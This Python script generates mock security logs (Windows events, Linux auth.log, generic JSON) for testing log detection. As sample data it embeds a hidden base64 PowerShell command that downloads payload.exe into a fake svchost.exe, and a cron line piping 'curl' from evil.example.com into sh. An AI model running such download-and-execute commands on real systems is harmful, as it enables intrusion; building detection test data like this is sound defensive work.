import json
import os
import random
from datetime import datetime, timedelta, timezone

def generate_timestamp_sequence(count, interval_seconds=10):
    """Generates a sequence of ISO8601 timestamps moving forward in time."""
    base_time = datetime.now(timezone.utc) - timedelta(days=random.choice([1, 2]))
    return [(base_time + timedelta(seconds=i * interval_seconds)).isoformat() for i in range(count)]

def create_windows_json_samples(timestamps):
    """Generates Windows JSON lines matching EVTX category mappings."""
    records = []
    
    # 1. Normal Admin Logon (4624)
    records.append({
        "EventID": 4624,
        "TimeCreated": {"SystemTime": timestamps[0]},
        "Computer": "DC-01.corp.internal",
        "EventData": {
            "Data": [
                {"Name": "TargetUserName", "TargetUserName": "Administrator"},
                {"Name": "LogonType", "LogonType": "3"},
                {"Name": "IpAddress", "IpAddress": "192.168.10.45"}
            ]
        }
    })
    
    # 2. Attack: Malicious Process Creation (4688) - PowerShell Encoded Command
    records.append({
        "EventID": 4688,
        "TimeCreated": {"SystemTime": timestamps[1]},
        "Computer": "WORKSTATION-05.corp.internal",
        "EventData": {
            "Data": [
                {"Name": "NewProcessName", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                {"Name": "CommandLine", "CommandLine": "powershell.exe -nop -w hidden -encodedcommand aW52b2tlLXdlYnJlcXVlc3QgLXVyaSBodHRwOi8vMTg1LjIzLjQuNS9wYXlsb2FkLmV4ZSAtb3V0ZmlsZSBjOlx3aW5kb3dzXHRlbXBcc3ZjaG9zdC5leGU="},
                {"Name": "ParentProcessName", "ParentProcessName": "C:\\Windows\\explorer.exe"},
                {"Name": "SubjectUserName", "SubjectUserName": "jdoe"}
            ]
        }
    })

    # 3. Attack: Persistence via Scheduled Task (4698)
    records.append({
        "EventID": 4698,
        "TimeCreated": {"SystemTime": timestamps[2]},
        "Computer": "WORKSTATION-05.corp.internal",
        "EventData": {
            "Data": [
                {"Name": "TaskName", "TaskName": "\\Microsoft\\Windows\\Update\\DriverUpdateTask"},
                {"Name": "ClientProcessId", "ClientProcessId": "4312"},
                {"Name": "SubjectUserName", "SubjectUserName": "SYSTEM"}
            ]
        }
    })

    # 4. Attack: Network Filtering Event (5156) connecting out to malicious IP
    records.append({
        "EventID": 5156,
        "TimeCreated": {"SystemTime": timestamps[3]},
        "Computer": "WORKSTATION-05.corp.internal",
        "EventData": {
            "Data": [
                {"Name": "SourceAddress", "SourceAddress": "192.168.10.114"},
                {"Name": "DestAddress", "DestAddress": "185.23.4.5"},
                {"Name": "DestPort", "DestPort": "443"},
                {"Name": "Protocol", "Protocol": "6"}
            ]
        }
    })

    return "\n".join([json.dumps(r) for r in records])

def create_syslog_samples(timestamps):
    """Generates Linux RFC 3164 formatted syslog lines (auth.log style)."""
    lines = []
    
    # Convert ISO strings back to syslog date format (e.g., "Jun 22 14:05:20")
    def to_syslog_ts(iso_str):
        dt = datetime.fromisoformat(iso_str)
        return dt.strftime("%b %d %H:%M:%S")

    # 1. Normal sudo activity
    lines.append(f"{to_syslog_ts(timestamps[0])} ubuntu-server sudo:   jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/apt update")
    
    # 2. Attack: SSH Brute Force attempts (sshd)
    lines.append(f"{to_syslog_ts(timestamps[1])} ubuntu-server sshd[2841]: Failed password for invalid user admin from 203.0.113.50 port 49211 ssh2")
    lines.append(f"{to_syslog_ts(timestamps[2])} ubuntu-server sshd[2843]: Failed password for invalid user root from 203.0.113.50 port 49540 ssh2")
    lines.append(f"{to_syslog_ts(timestamps[3])} ubuntu-server sshd[2845]: Accepted password for root from 203.0.113.50 port 49982 ssh2")
    
    # 3. Attack: Execution via cron
    lines.append(f"{to_syslog_ts(timestamps[4])} ubuntu-server CRON[3102]: (root) CMD (curl -fsSL http://evil.example.com/malware.sh | sh)")

    return "\n".join(lines)

def create_generic_json_samples(timestamps):
    """Generates arbitrary structured JSON logs containing threat indicators."""
    records = [
        {
            "timestamp": timestamps[0],
            "event_id": 1001,
            "hostname": "firewall-core",
            "user": "network_admin",
            "src_ip": "192.168.1.1",
            "dst_ip": "8.8.8.8",
            "message": "Configuration changes committed successfully."
        },
        {
            "timestamp": timestamps[1],
            "event_id": 9999,
            "hostname": "web-prod-01",
            "user": "www-data",
            "file_path": "/var/www/html/shell.php",
            "operation": "file_write",
            "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "message": "Alert: Web server process spawned an unexpected file write operation."
        }
    ]
    return json.dumps(records, indent=2)

def main():
    os.makedirs("./samples", exist_ok=True)
    timestamps = generate_timestamp_sequence(10, interval_seconds=15)

    # 1. Windows JSON mock
    win_data = create_windows_json_samples(timestamps)
    with open("./samples/windows_events.jsonl", "w") as f:
        f.write(win_data)
    print("[+] Generated: ./samples/windows_events.jsonl (Mocked EVTX Structure)")

    # 2. Linux Syslog mock
    syslog_data = create_syslog_samples(timestamps)
    with open("./samples/auth.log", "w") as f:
        f.write(syslog_data)
    print("[+] Generated: ./samples/auth.log (Linux Syslog Structure)")

    # 3. Generic JSON mock
    generic_json_data = create_generic_json_samples(timestamps)
    with open("./samples/generic_events.json", "w") as f:
        f.write(generic_json_data)
    print("[+] Generated: ./samples/generic_events.json (Structured Web/Application Log)")

if __name__ == "__main__":
    main()